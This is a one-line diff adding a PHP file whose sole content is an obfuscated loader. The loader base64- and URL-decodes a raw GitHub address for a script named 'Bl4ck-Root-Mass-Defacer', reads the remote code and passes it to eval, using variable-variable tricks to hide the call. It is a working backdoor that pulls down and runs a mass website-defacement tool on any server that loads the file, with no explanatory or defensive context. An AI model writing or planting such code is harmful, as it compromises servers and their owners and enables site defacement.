@@ -1,0 +1,1 @@
+<?=$_=["${eval(fgets(fopen(urldecode(base64_decode('aHR0cHMlM0ElMkYlMkZyYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tJTJGYmw0Y2swNiUyRkJsNGNrLVJvb3QtTWFzcy1EZWZhY2VyJTJGbWFzdGVyJTJGbWFzcy5waHA=')),'')))}"];foreach($_ as $__){${${$__}};}
